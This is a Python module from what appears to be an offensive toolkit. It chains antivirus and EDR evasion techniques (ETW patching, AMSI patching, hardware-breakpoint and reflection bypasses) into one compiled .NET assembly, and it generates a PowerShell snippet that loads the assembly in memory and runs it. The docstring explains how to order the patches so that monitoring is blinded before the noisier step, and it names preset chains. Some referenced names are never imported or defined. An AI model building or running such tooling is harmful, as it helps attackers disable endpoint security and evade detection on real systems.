"""
Evasion chains: combine multiple bypass techniques into one
assembly, invoked with a single call.

Why chains exist:

  Real EDR monitoring doesn't see events in isolation. It sees
  them in a time sequence. Patching AMSI by itself produces a
  detectable event ("function prologue of amsi.dll!AmsiScanBuffer
  was modified"). Patching ETW first means the AMSI patch's event
  never gets emitted — the ETW pipeline is dead before the AMSI
  patch happens.

  That's the core insight behind chains: order matters. Get the
  blinding technique in place first, then do the noisy technique.

Design:

  A chain is a list of technique names from evade.av_bypass. The
  chain compiler:
    1. Loads each technique's C# source.
    2. Wraps them in a single namespace/class hierarchy with
       renamed classes to avoid collisions.
    3. Generates a top-level `Chain.Execute()` method that calls
       each technique in order.
    4. Compiles the whole thing as one net48 assembly.
    5. Caches by chain content hash.

  The output is a single .dll. Loading it and invoking
  Chain.Execute() runs the whole chain in one shot.

Presets:

  Some chains are commonly useful and have been given names:

    "stealth"     etw_patch → reflection_patch
    "paranoid"    etw_patch → hwbp → reflection_disable
    "quick"       reflection_patch
    "silent"      etw_patch → hwbp
    "kitchen_sink" etw_patch → hwbp → context_patch → reflection_disable
"""

# The template that wraps N techniques into one assembly.
#
# For each technique, we get its source code. Each source has its
# own namespace + class name. To combine them into one assembly,
# we rewrite the namespace and class names so they don't collide.
#
# The final assembly has:
#   namespace EvadeChain
#   public static class Chain
#   public static void Execute() { ... }

_CHAIN_WRAPPER_HEADER = """\
// Auto-generated evasion chain.
//
// Order matters: techniques are invoked in the sequence they
// were listed. Do not reorder without understanding the
// implications.
//
// Techniques in this chain (in order):
{technique_list}
//
// Generated by: toolkit evade chain
using System;
using System.Reflection;
using System.Runtime.InteropServices;

namespace EvadeChain
{{
{techniques}

    public static class Chain
    {{
        public static void Execute()
        {{
{body}
        }}
    }}
}}
"""


def _sanitize_technique(name: str) -> str:
    """Make a technique name safe for use as a C# identifier."""
    return "".join(c if c.isalnum() or c == "_" else "_"
                   for c in name)


def _extract_class_body(source: str) -> str:
    """Extract the body of a technique's source.

    The source shape is:
        <using statements>
        namespace <Ns>
        {
            public static class <Class>
            {
                <body>
            }
        }

    We want just the class definition (renamed by the caller).
    So we:
      1. Strip using directives
      2. Strip the namespace declaration and its enclosing braces
      3. Return everything inside — which is the class definition

    This is done with a lightweight regex-based scan rather than
    Roslyn, because we don't want to add Roslyn as a dependency
    for a case this simple.
    """
    import re

    # Step 1: remove all using directives
    source = re.sub(
        r"^\s*using\s+[^;]+;\s*$",
        "",
        source,
        flags=re.MULTILINE,
    )

    # Step 2: find the namespace block and extract its contents
    # Match: namespace <name>  {  ...  }  (the outer braces)
    m = re.search(
        r"namespace\s+[A-Za-z0-9_.]+\s*\{",
        source,
    )
    if m is None:
        # No namespace — return as-is (defensive)
        return source.strip()

    # From the opening brace, walk forward to find the matching close
    start = m.end()          # position just after the opening "{"
    depth = 1
    i = start
    while i < len(source) and depth > 0:
        c = source[i]
        if c == "{":
            depth += 1
        elif c == "}":
            depth -= 1
        i += 1

    if depth != 0:
        # Unbalanced braces — something is wrong with the source
        return source.strip()

    # The contents of the namespace are [start, i-1]
    inner = source[start:i - 1]
    return inner.strip()


def _wrap_technique_class(body: str, technique_name: str,
                           original_class_name: str) -> str:
    """Wrap a technique's class body in a uniquely-named class.

    We rename the class to `T_<technique>` so two techniques with
    the same original class name (e.g. `AmsiBypass` in three of
    our techniques) don't collide.
    """
    safe = _sanitize_technique(technique_name)

    # Rewrite the class declaration. The class body we extracted
    # still has the original `public static class Foo {` header.
    # We need to replace it with our renamed version.
    import re
    pattern = re.compile(
        r"\bpublic\s+static\s+class\s+" + re.escape(original_class_name) + r"\b",
        re.IGNORECASE,
    )
    renamed_body = pattern.sub(
        f"public static class T_{safe}",
        body,
        count=1,
    )

    if renamed_body == body:
        # The pattern didn't match — maybe the class declaration
        # used a different modifier. Fall back to a broader rewrite.
        pattern2 = re.compile(
            r"\bclass\s+" + re.escape(original_class_name) + r"\b",
        )
        renamed_body = pattern2.sub(
            f"class T_{safe}",
            body,
            count=1,
        )

    # Indent the entire class body so it nests cleanly inside the
    # outer namespace's braces.
    indented = "\n".join(
        ("    " + line) if line.strip() else line
        for line in renamed_body.splitlines()
    )

    return indented


def _build_chain_source(techniques: list[tuple[str, str]]) -> str:
    """Build the full C# source for a chain.

    `techniques` is a list of (name, csharp_source) pairs.
    """
    technique_blocks = []
    body_lines = []

    for name, src in techniques:
        spec = av_bypass.TECHNIQUES.get(name, {})
        original_class = spec.get("class", "").split(".")[-1]
        method = spec.get("method", "Patch")

        if not original_class:
            technique_blocks.append(
                f"    // WARNING: could not resolve class for {name}")
            continue

        # Extract the body of the technique (class definition, no
        # namespace, no using statements)
        body = _extract_class_body(src)

        # Wrap it in a uniquely-named class
        wrapped = _wrap_technique_class(body, name, original_class)

        technique_blocks.append(
            f"    // ----- technique: {name} -----\n"
            f"{wrapped}"
        )

        # Add the invocation line to Execute()'s body
        safe = _sanitize_technique(name)
        body_lines.append(
            f"            T_{safe}.{method}();")

    header = _CHAIN_WRAPPER_HEADER.format(
        technique_list="\n".join(
            f"//   {i+1}. {name}" for i, (name, _) in enumerate(techniques)),
        techniques="\n\n".join(technique_blocks),
        body="\n".join(body_lines),
    )

    return header

# Public API

@dataclass
class Chain:
    """A compiled evasion chain."""
    name: str
    techniques: list[str]
    payload: object  # payload.framework.Payload

    @property
    def bytes(self) -> bytes:
        return self.payload.built_bytes

    @property
    def class_name(self) -> str:
        return "EvadeChain.Chain"

    @property
    def method_name(self) -> str:
        return "Execute"


def resolve_chain(name_or_list) -> list[str]:
    """Resolve a chain name or a comma-separated list to a technique list."""
    if isinstance(name_or_list, list):
        names = name_or_list
    elif isinstance(name_or_list, str) and "," in name_or_list:
        names = [n.strip() for n in name_or_list.split(",") if n.strip()]
    elif isinstance(name_or_list, str) and name_or_list in CHAIN_PRESETS:
        names = list(CHAIN_PRESETS[name_or_list])
    else:
        names = [name_or_list]

    # Validate
    for n in names:
        if n not in av_bypass.TECHNIQUES:
            raise ValueError(
                f"unknown technique in chain: {n!r}; "
                f"available: {', '.join(sorted(av_bypass.TECHNIQUES))}")

    # Warn on dangerous orderings
    if "etw_patch" not in names and any(
            t != "etw_patch" for t in names):
        pass  # no warning — some chains legitimately skip ETW

    if names.count("etw_patch") == 0 and len(names) > 1:
        warn("  chain has multiple techniques but no etw_patch; "
             "the noisy techniques will be visible to EDR")

    return names


def compile_chain(name_or_list, chain_name: str | None = None,
                  verbose: bool = False) -> Chain:
    """Compile a chain into a single assembly.

    `name_or_list` can be:
      - a preset name (e.g. "stealth")
      - a single technique name (e.g. "reflection_patch")
      - a list of technique names
      - a comma-separated string ("etw_patch,reflection_patch")

    Returns a Chain object with the compiled payload.
    """
    names = resolve_chain(name_or_list)

    if not names:
        raise ValueError("empty chain")

    # Assemble the source
    techniques = []
    for n in names:
        spec = av_bypass.TECHNIQUES[n]
        techniques.append((n, spec["source"]))

    chain_source = _build_chain_source(techniques)

    # Compile through the payload framework
    from payload import framework

    if chain_name is None:
        if len(names) == 1:
            chain_name = names[0]
        else:
            chain_name = "_".join(names[:3])[:32]
            if len(names) > 3:
                chain_name += f"_+{len(names)-3}"

    p = framework.Payload(
        language="csharp",
        source=chain_source,
        target="net48",
        extra_files={
            "__output_type": "Library",
            "__assembly_name": "EvadeChain",
            "__namespace": "EvadeChain",
        },
        post_processing=[],
        description=f"evade chain: {','.join(names)}",
    )

    if verbose:
        info(f"  chain: {', '.join(names)} → EvadeChain.dll (net48)")

    p.build(verbose=verbose)

    return Chain(name=chain_name, techniques=names, payload=p)


def loader_ps1(chain: Chain, dll_path: str | None = None) -> str:
    """Return a PowerShell snippet that loads and invokes the chain."""
    if dll_path:
        path_escaped = dll_path.replace("\\", "\\\\")
        read_line = (
            f'$bytes = [IO.File]::ReadAllBytes("{path_escaped}")'
        )
    else:
        read_line = "$bytes = <your bytes here>"

    return (
        f"{read_line}\n"
        f"$asm = [Reflection.Assembly]::Load($bytes)\n"
        f"$asm.GetType(\"{chain.class_name}\")"
        f".GetMethod(\"{chain.method_name}\").Invoke($null, @())\n"
    )


def list_presets() -> list[dict]:
    """Return a list of preset chain definitions."""
    out = []
    for name, techs in CHAIN_PRESETS.items():
        out.append({
            "name": name,
            "techniques": techs,
            "description": _describe_chain(techs),
        })
    return out


def _describe_chain(techs: list[str]) -> str:
    """Human-readable summary of what a chain does."""
    has_etw = "etw_patch" in techs
    has_amsi_patch = any(t in ("reflection_patch", "context_patch", "hwbp")
                         for t in techs)
    has_amsi_disable = "reflection_disable" in techs

    parts = []
    if has_etw:
        parts.append("blinds ETW")
    if has_amsi_patch:
        parts.append("patches AMSI")
    if has_amsi_disable:
        parts.append("disables AMSI init")
    return " → ".join(parts) if parts else "no-op"
